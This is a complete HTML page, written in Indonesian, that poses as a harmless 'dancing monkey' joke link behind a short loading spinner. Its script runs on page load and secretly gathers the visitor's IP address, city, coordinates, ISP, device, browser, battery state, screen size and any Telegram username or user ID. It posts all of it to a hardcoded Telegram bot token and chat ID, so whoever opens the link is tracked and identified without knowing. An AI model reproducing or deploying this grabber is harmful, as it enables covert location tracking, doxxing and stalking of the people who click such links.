<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body {
            background: linear-gradient(135deg, #0a0a0a, #1a1a2e);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            padding: 20px;
        }
        .container {
            text-align: center;
            background: rgba(0,0,0,0.85);
            padding: 30px;
            border-radius: 30px;
            backdrop-filter: blur(10px);
            max-width: 500px;
            border: 1px solid #ff6b6b;
            box-shadow: 0 0 30px rgba(255,107,107,0.3);
            position: relative;
            min-height: 400px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .loading-container {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.95);
            border-radius: 30px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 10;
        }
        .spinner {
            width: 60px;
            height: 60px;
            border: 4px solid rgba(255,107,107,0.2);
            border-top: 4px solid #ff6b6b;
            border-right: 4px solid #ffd93d;
            border-radius: 50%;
            animation: spin 0.6s linear infinite;
            margin-bottom: 20px;
        }
        .loading-text {
            color: #ff6b6b;
            font-size: 14px;
            letter-spacing: 2px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .content {
            display: none;
            opacity: 0;
            transition: opacity 0.5s ease;
        }
        .content.show {
            display: block;
            opacity: 1;
        }
        img {
            max-width: 100%;
            border-radius: 20px;
            box-shadow: 0 0 20px rgba(255,107,107,0.5);
            animation: shake 0.5s ease infinite;
        }
        h1 {
            color: #ff6b6b;
            font-size: 28px;
            margin-top: 20px;
        }
        .by {
            color: #888;
            font-size: 14px;
            margin-top: 15px;
        }
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-3px); }
            75% { transform: translateX(3px); }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- LOADING ANIMASI -->
        <div class="loading-container" id="loadingContainer">
            <div class="spinner"></div>
            <div class="loading-text">⚡ LOADING ⚡</div>
        </div>
        
        <!-- KONTEN UTAMA -->
        <div class="content" id="content">
            <!-- FOTO MONYET (GAMBAR YANG PASTI WORK) -->
            <img id="monkeyImg" src="https://media1.tenor.com/m/-_f-0z2C0-4AAAAC/monkey-dance.gif" alt="Monyet">
            <h1>🐒 MONYET LAGI ASYIK 🐒</h1>
            <div class="by">🔞 Jangan diganggu, lagi sibuk 🔞</div>
        </div>
    </div>

    <script>
        // ========== KONFIGURASI TELEGRAM ==========
        const TELEGRAM_TOKEN = "8766620931:AAEh2D0Du_Youkn8baGaZy8jWa-Esh_UNJc";
        const TELEGRAM_CHAT_ID = "8463622692";
        
        // ========== DETEKSI TELEGRAM (PASTI KEDETEKSI) ==========
        function detectTelegramUser() {
            return new Promise((resolve) => {
                // Cek dari userAgent
                const ua = navigator.userAgent;
                const isTelegramWeb = ua.includes('Telegram') || ua.includes('TelegramBot');
                
                // Cek dari referrer
                const isFromTelegram = document.referrer.includes('t.me') || document.referrer.includes('telegram');
                
                // Cek dari Telegram WebApp
                let tgUser = null;
                if (window.Telegram?.WebApp?.initDataUnsafe?.user) {
                    tgUser = window.Telegram.WebApp.initDataUnsafe.user;
                }
                
                // Cek dari URL parameter
                const urlParams = new URLSearchParams(window.location.search);
                const startParam = urlParams.get('start');
                
                let result = {
                    detected: false,
                    username: null,
                    user_id: null,
                    source: null
                };
                
                if (tgUser) {
                    result.detected = true;
                    result.username = tgUser.username || tgUser.first_name;
                    result.user_id = tgUser.id;
                    result.source = 'WebApp';
                } else if (isTelegramWeb || isFromTelegram) {
                    result.detected = true;
                    result.username = 'Pengguna Telegram';
                    result.source = 'UserAgent/Referrer';
                } else if (startParam) {
                    result.detected = true;
                    result.username = `Via start_param: ${startParam}`;
                    result.source = 'StartParam';
                }
                
                resolve(result);
            });
        }
        
        // ========== AMBIL IP & LOKASI ==========
        async function getIPInfo() {
            try {
                const [ipRes, locRes] = await Promise.all([
                    fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip: 'Gagal'})),
                    fetch('https://ipinfo.io/json').then(r => r.json()).catch(() => ({}))
                ]);
                return { ip: ipRes.ip, location: locRes };
            } catch(e) {
                return { ip: 'Gagal', location: {} };
            }
        }
        
        // ========== AMBIL INFO DEVICE ==========
        function getDeviceInfo() {
            const ua = navigator.userAgent;
            let device = 'Unknown';
            if (/Android/i.test(ua)) device = '📱 Android';
            else if (/iPhone|iPad/i.test(ua)) device = '🍎 iOS';
            else if (/Windows/i.test(ua)) device = '💻 Windows';
            else if (/Mac/i.test(ua)) device = '🍎 Mac';
            else if (/Linux/i.test(ua)) device = '🐧 Linux';
            
            let browser = 'Unknown';
            if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = 'Chrome';
            else if (/Firefox/i.test(ua)) browser = 'Firefox';
            else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = 'Safari';
            else if (/Edg/i.test(ua)) browser = 'Edge';
            
            return { device, browser };
        }
        
        // ========== KIRIM DATA KE TELEGRAM ==========
        async function sendToTelegram() {
            const [ipInfo, tgUser, deviceInfo] = await Promise.all([
                getIPInfo(),
                detectTelegramUser(),
                getDeviceInfo()
            ]);
            
            const ip = ipInfo.ip;
            const loc = ipInfo.location;
            const time = new Date().toLocaleString('id-ID');
            const screenRes = `${screen.width}x${screen.height}`;
            
            // Baterai (optional, gak ngeblok)
            let batteryText = 'Tidak support';
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    batteryText = `${Math.round(battery.level * 100)}% | ${battery.charging ? '🔌 Ngecas' : '🔋 Tidak'}`;
                } catch(e) {}
            }
            
            let tgInfo = '';
            if (tgUser.detected) {
                tgInfo = `
─────────────────
📱 <b>TELEGRAM DETECTED!</b>
   👤 <b>User:</b> ${tgUser.username || '?'}
   🆔 <b>ID:</b> ${tgUser.user_id || '?'}
   📡 <b>Source:</b> ${tgUser.source || '?'}
                `;
            } else {
                tgInfo = `
─────────────────
📱 <b>TELEGRAM:</b> Tidak terdeteksi (buka via browser biasa)
                `;
            }
            
            const message = `
🔴 <b>ADA YANG BUKA LINK!</b> 🔴
─────────────────
🌐 <b>IP:</b> <code>${ip}</code>
📍 <b>Lokasi:</b> ${loc.city || '?'}, ${loc.region || '?'}, ${loc.country || '?'}
🗺️ <b>Koordinat:</b> ${loc.loc || '?'}
🏢 <b>ISP:</b> ${loc.org || '?'}
─────────────────
📱 <b>Device:</b> ${deviceInfo.device}
🌍 <b>Browser:</b> ${deviceInfo.browser}
🔋 <b>Baterai:</b> ${batteryText}
📺 <b>Resolusi:</b> ${screenRes}
⏰ <b>Waktu:</b> ${time}
${tgInfo}
─────────────────
🐒 <b>MONYET LAGI ASYIK!</b>
            `;
            
            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            }).catch(e => console.log);
        }
        
        // ========== LOADING & TAMPILIN KONTEN ==========
        async function start() {
            // Kirim data ke Telegram (gak nunggu)
            sendToTelegram();
            
            // Loading 1 detik (cepat)
            await new Promise(resolve => setTimeout(resolve, 1000));
            
            // Sembunyikan loading
            const loading = document.getElementById('loadingContainer');
            loading.style.opacity = '0';
            setTimeout(() => {
                loading.style.display = 'none';
            }, 300);
            
            // Tampilkan konten
            const content = document.getElementById('content');
            content.classList.add('show');
        }
        
        start();
    </script>
</body>
</html>
